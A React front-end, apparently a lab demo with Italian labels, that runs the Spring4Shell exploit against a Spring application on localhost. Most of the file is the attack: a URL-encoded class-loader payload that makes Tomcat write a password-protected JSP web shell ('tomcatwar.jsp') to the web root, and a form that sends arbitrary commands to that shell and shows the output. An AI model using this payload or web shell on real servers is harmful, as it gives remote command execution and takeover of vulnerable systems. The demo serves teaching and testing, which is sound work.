import axios from "axios";
import { useState } from "react";
import Button from 'react-bootstrap/Button';


const RCEForm = ({success}) => {
  
  const [r,setR] = useState("")
  const [newCommand,setNewCommand] = useState("")

  const onSubmit = async (event) => {
    event.preventDefault()
    
    const url = "http://localhost:8080/tomcatwar.jsp"
    const params = {
      "pwd":"j",
      "cmd":newCommand
    }

    const response = await axios.get(url,{params:params})
    console.log(response)
    setR(response.data.substring(0,response.data.indexOf("/")))
  }

  const handleCommandChange = (event) => {
    console.log(event.target.value)
    setNewCommand(event.target.value)
  }

  if(success){
    return (
      <div className="container">
      <h2>Command Injection</h2>
      <form onSubmit={onSubmit}>
        <input
          value={newCommand}
          onChange={handleCommandChange}
        />
        <button type="submit">save</button>
      </form>   
      <p>{r}</p>
      </div>
    )
  }
  else  {
    return  <div className="container"><h2>eseguire l'exploit</h2></div>
  }
}

const App = () => {

  const [gSaluto,gSetSaluto] = useState("")
  const [pSaluto,pSetSaluto] = useState("")
  const [success,setSuccess] = useState(0)

  let headers = {
    "suffix": "%>//",
    "c1": "Runtime",
    "c2": "<%",
    "DNT": "1",
    "Content-Type": "application/x-www-form-urlencoded",
}
  
  const get = async () => {
    const response = await axios.get("http://localhost:8080/helloworld/greeting")
    gSetSaluto(response.data)
  }
  
  const post = async () => {
    const response = await axios.post("http://localhost:8080/helloworld/greeting")
    pSetSaluto(response.data)
  }

  const exploit = async () => {
    
    let payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    
    const rce = await axios.post("http://localhost:8080/helloworld/greeting",payload,{headers:headers})

    console.log(rce.status)

    setTimeout(() => setSuccess(1),4000)
  }

  return (
    <div className="container">
      <h1>Spring4Shell</h1>
      <Button onClick={get}>Manda una GET</Button>
      <p>Il server risponde: {gSaluto}</p>
      <Button onClick={post}>Manda una POST</Button>
      <p>Il server risponde: {pSaluto}</p>
      <Button onClick={exploit}>Exploit</Button>
      <RCEForm success={success}/>
    </div>
  )
}

export default App;
